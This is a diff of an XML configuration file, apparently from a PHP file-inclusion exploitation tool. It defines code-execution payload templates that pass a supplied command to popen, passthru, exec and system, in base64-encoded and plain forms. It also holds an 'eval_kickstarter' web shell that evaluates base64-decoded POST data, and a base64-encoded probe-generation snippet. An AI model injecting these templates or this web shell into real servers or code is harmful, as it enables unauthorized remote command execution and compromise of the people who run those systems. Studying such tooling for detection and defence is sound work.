@@ -17,10 +17,14 @@
 	</log_files>
 	
 	<exec_methods>
-		<exec name="popen"    source='&lt;? $h=popen(base64_decode("__PAYLOAD__") . " 2&gt;&amp;1", "r");while(!feof($h)){$l=fread($h, 2024);echo $l;}?&gt;' />
-		<exec name="passthru" source='&lt;? passthru (base64_decode("__PAYLOAD__"). " 2&gt;&amp;1"); ?&gt;' />
-		<exec name="exec"     source='&lt;? echo exec (base64_decode("__PAYLOAD__"). " 2&gt;&amp;1"); ?&gt;' />
-		<exec name="popen"    source='&lt;? system (base64_decode("__PAYLOAD__"). " 2&gt;&amp;1"); ?&gt;' />
+		<exec dobase64="1" name="popen[b64]"    source='&lt;? $h=popen(base64_decode("__PAYLOAD__") . " 2&gt;&amp;1", "r");while(!feof($h)){$l=fread($h, 2024);echo $l;}?&gt;' />
+		<exec dobase64="1" name="passthru[b64]" source='&lt;? passthru (base64_decode("__PAYLOAD__"). " 2&gt;&amp;1"); ?&gt;' />
+		<exec dobase64="1" name="exec[b64]"     source='&lt;? echo exec (base64_decode("__PAYLOAD__"). " 2&gt;&amp;1"); ?&gt;' />
+		<exec dobase64="1" name="popen[b64]"    source='&lt;? system (base64_decode("__PAYLOAD__"). " 2&gt;&amp;1"); ?&gt;' />
+		<exec dobase64="0" name="popen"    		source='&lt;? $h=popen("__PAYLOAD__" . " 2&gt;&amp;1", "r");while(!feof($h)){$l=fread($h, 2024);echo $l;}?&gt;' />
+		<exec dobase64="0" name="passthru" 		source='&lt;? passthru ("__PAYLOAD__". " 2&gt;&amp;1"); ?&gt;' />
+		<exec dobase64="0" name="exec"     		source='&lt;? echo exec ("__PAYLOAD__". " 2&gt;&amp;1"); ?&gt;' />
+		<exec dobase64="0" name="popen"    		source='&lt;? system ("__PAYLOAD__". " 2&gt;&amp;1"); ?&gt;' />
 	</exec_methods>
 	
 	<payloads>
@@ -37,9 +41,9 @@
 	</payloads>
 	
 	<methods>
-		<quiz source="cm5kID0gc2VsZi5nZXRSYW5kb21TdHIoKQpwaHBjb2RlID0gImVjaG8gIgpmb3IgYyBpbiBybmQ6CiAgICBwaHBjb2RlICs9ICJjaHIoJWQpLiIlKG9yZChjKSkKcGhwY29kZSA9ICI8P3BocCAlczsgPz4iICUocGhwY29kZVs6LTFdKQpyZXQgPSAocGhwY29kZSwgcm5kKQo=" />
-		<print source="&lt;?php echo '__PLACEHOLDER__'; ?&gt;" />
-		<eval_kickstarter source="&lt;?php eval(base64_decode($_POST['data'])); ?&gt;" />
+		<quiz 				isbase64="1" 	source="cm5kID0gc2VsZi5nZXRSYW5kb21TdHIoKQpwaHBjb2RlID0gImVjaG8gIgpmb3IgYyBpbiBybmQ6CiAgICBwaHBjb2RlICs9ICJjaHIoJWQpLiIlKG9yZChjKSkKcGhwY29kZSA9ICI8P3BocCAlczsgPz4iICUocGhwY29kZVs6LTFdKQpyZXQgPSAocGhwY29kZSwgcm5kKQo=" />
+		<print 				isbase64="0" 	source="&lt;?php echo '__PLACEHOLDER__'; ?&gt;" />
+		<eval_kickstarter 	isbase64="0" 	source="&lt;?php eval(base64_decode($_POST['data'])); ?&gt;" />
 	</methods>
 	
 	<detectors>
